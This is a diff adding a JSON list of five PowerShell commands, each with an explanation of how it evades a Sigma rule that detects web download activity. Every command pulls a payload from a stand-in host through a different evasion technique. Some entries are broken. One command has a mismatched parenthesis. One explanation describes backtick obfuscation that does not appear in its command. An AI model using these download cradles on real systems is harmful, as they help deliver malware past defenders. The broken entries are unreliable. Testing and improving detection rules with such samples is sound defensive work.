@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"$wc = New-Object ('Net.W' + 'ebClient'); $wc.DownloadString('http://example.com/payload')\"",
+    "explanation": "Bypasses the 'Net.WebClient' detection by dynamically concatenating the class name string at runtime."
+  },
+  {
+    "output": "powershell.exe -Command \"$client = New-Object System.Net.Http.HttpClient; $res = $client.GetAsync('http://example.com/payload').Result.Result); $res.Content.ReadAsStringAsync().Result\"",
+    "explanation": "Utilizes the System.Net.Http.HttpClient class, which achieves the same web request functionality but is entirely omitted from the rule's selection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"iwr('http://example.com/payload')\"",
+    "explanation": "Bypasses the 'iwr ' detection by removing the trailing space. PowerShell allows evaluating the URI directly within parentheses, evading the exact substring match."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/payload\"",
+    "explanation": "Employs PowerShell backtick obfuscation. The command executes normally, but the process command-line logs will register the backticks, bypassing the 'Invoke-WebRequest' string match."
+  },
+  {
+    "output": "powershell.exe -Command \"$req = New-Object -ComObject Msxml2.XMLHTTP; $req.open('GET', 'http://example.com/payload', $false); $req.send(); $req.responseText\"",
+    "explanation": "Leverages the Msxml2.XMLHTTP COM object to initiate a web request, a method not monitored by the provided Sigma rule."
+  }
+]
